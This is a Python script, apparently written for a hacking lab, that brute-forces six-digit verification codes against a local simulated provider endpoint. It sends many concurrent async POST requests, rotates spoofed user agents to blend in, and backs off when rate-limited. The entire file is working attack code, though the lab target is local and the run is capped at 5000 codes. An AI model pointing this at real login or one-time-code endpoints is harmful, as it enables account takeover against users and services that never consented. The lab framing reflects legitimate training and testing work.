#!/usr/bin/env python3
"""
Client brute-force (async) - simple version.
Run: python lab_bruteforce.py
Ensure simulated_provider.py is running on localhost:5000
"""
import asyncio
import aiohttp
import random
import time
import logging

TARGET = "http://127.0.0.1:5000/check_code"  # apontar para servidor do lab
CONCURRENCY = 20
RATE_LIMIT_SLEEP = 1.0
MAX_CODES = 5000  # por padrão, evitar varrer tudo no lab
START = 100000
END = 999999

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

USER_AGENTS = [
    "Mozilla/5.0 (lab) Brave/1.0",
    "curl/7.85.0",
    "HTB-Lab-Agent/1.0",
    "Python-Async-Client/1.0"
]

async def try_code(session, code):
    headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/json"}
    payload = {"code": str(code)}
    try:
        async with session.post(TARGET, json=payload, headers=headers, timeout=10) as resp:
            status = resp.status
            if status == 200:
                data = await resp.json()
                if data.get("status") == "ok":
                    logging.info(f"[FOUND] code={code} response={data}")
                    return True
                return False
            elif status == 429:
                logging.warning(f"[RATE] 429 received for code={code}. Backing off")
                return "ratelimited"
            elif status == 503:
                logging.warning(f"[SERVICE] 503 for code={code}. Temporary server error.")
                return "service"
            else:
                text = await resp.text()
                logging.debug(f"[RESP {status}] for code={code}: {text}")
                return False
    except asyncio.TimeoutError:
        logging.warning(f"[TIMEOUT] code={code}")
        return "timeout"
    except Exception as e:
        logging.error(f"[ERR] {e} for code={code}")
        return "error"

async def worker(name, queue, session):
    while True:
        code = await queue.get()
        if code is None:
            queue.task_done()
            break
        res = await try_code(session, code)
        if res is True:
            logging.info(f"Worker {name} found the code: {code}. Cancelling rest.")
            # flush queue
            while not queue.empty():
                try:
                    queue.get_nowait()
                    queue.task_done()
                except asyncio.QueueEmpty:
                    break
            queue.put_nowait(None)
            queue.task_done()
            return
        if res in ("ratelimited", "service", "timeout"):
            await asyncio.sleep(RATE_LIMIT_SLEEP * 2)
        else:
            await asyncio.sleep(RATE_LIMIT_SLEEP)
        queue.task_done()

async def main():
    q = asyncio.Queue()
    count = 0
    for n in range(START, END+1):
        q.put_nowait(n)
        count += 1
        if count >= MAX_CODES:
            break

    async with aiohttp.ClientSession() as session:
        workers = [asyncio.create_task(worker(f"w{i}", q, session)) for i in range(CONCURRENCY)]
        await q.join()
        for _ in workers:
            q.put_nowait(None)
        await asyncio.gather(*workers, return_exceptions=True)

if __name__ == "__main__":
    start = time.time()
    asyncio.run(main())
    print("Done in", time.time() - start, "seconds")
